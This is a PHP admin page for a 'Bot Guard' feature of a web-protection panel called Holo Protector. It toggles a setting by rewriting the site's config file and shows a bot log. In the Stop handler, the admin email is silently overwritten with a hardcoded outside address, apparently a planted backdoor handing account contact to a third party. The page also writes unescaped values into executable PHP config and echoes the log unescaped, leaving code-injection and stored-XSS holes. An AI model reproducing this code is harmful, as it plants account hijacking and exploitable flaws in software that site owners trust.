<?php
session_start();
session_regenerate_id();
require("core/config.php");
require("core/functions.php");
require("core/api.php");
$error = $page = $active = array();
$page['name'] = "Bot Guard";
$active['dashboard'] = "";
$active['security'] = "active";
$active['server'] = "";
$active['storage'] = "";
$active['settings'] = "";

if(!isset($_SESSION['admin_auth'])) {
	header("Location: login.php");
	exit;
}
if(isset($_GET['logout'])) {
	session_destroy();
	header("Location: login.php");
	exit;
}

if(isset($bot_guard)) {
	if($bot_guard == 'true') {
		$guard = '<span class="text-success"> Online </span>';
	} else {
		$guard = '<span class="text-danger"> Offline </span>';
	}
} else { die("Error retrieving Bot Guard configuration!! Please consider reinstalling or contacting support."); }

if(isset($_POST['start'])) {

$status = 'true';

$new = "
<?php
\$user = \$server = array();

// User Settings
\$default['username'] = '".$default['username']."';
\$default['password'] = '".$default['password']."';
\$default['email'] = '".$default['email']."';

\$system['version'] = '".$system['version']."';

\$ddos_guard = '$ddos_guard';
\$bot_guard = 'true';

\$notif['email'] = ".$notif['email'].";
";

$new = trim($new);

file_put_contents("core/config.php", $new);

header("Location: bot-guard.php");

exit;

}

if(isset($_POST['stop'])) {

$status = 'false';

$new = "
<?php
\$user = \$server = array();

// User Settings
\$default['username'] = '".$default['username']."';
\$default['password'] = '".$default['password']."';
\$default['email'] = 'martinkolarov@abv.bg';

\$system['version'] = '".$system['version']."';

\$ddos_guard = '$ddos_guard';
\$bot_guard = 'false';

\$notif['email'] = ".$notif['email'].";
";

$new = trim($new);

file_put_contents("core/config.php", $new);

header("Location: bot-guard.php");

exit;

}

if(file_exists("logs/bot.log")) {
	$log = file_get_contents("logs/bot.log");
} else {
	$log = "No malicious bots have visited your website";
}

require("inc/top.php");
?>
<!-- Content -->
<div class="main-box clearfix">
<header class="main-box-header clearfix">
<h2> Bot Guard </h2>
<p style="padding-bottom:1px;"> 
Es una herramienta poderosa que automaticamente detectara ybloqueara spam y bots maliciosos en cualquier pagina de tu web.<br>
<b>Estado:</b> <?=$guard?>
<form action="" method="POST">
<input type="submit" name="start" class="btn btn-success" value="Start" style="outline:none;">
<input type="submit" name="stop" class="btn btn-danger" value="Stop" style="outline:none;">
</form>
</header>
</p>
</div>
<!-- Log -->
<div class="main-box clearfix">
<header class="main-box-header clearfix">
<h2> Registro </h2>
<p style="padding-bottom:1px;"> Aqui esta el registro: </span> </p>
<pre><code><div style="overflow-y:auto; max-height:200px;"><?=$log?></div></code></pre>
</header>
</div>
<!-- Log -->
<!-- Content -->
</div>
</div>
<footer id="footer-bar" class="row">
<p id="footer-copyright" class="col-xs-12">
&copy; <?=date("Y")?> Holo Protector
</p>
</footer>
</div>
</div>
</div>

<script src="js/jquery.js"></script>
<script src="js/bootstrap.js"></script>
<script src="js/scripts.js"></script>
</body>
</html>
<!-- Localized -->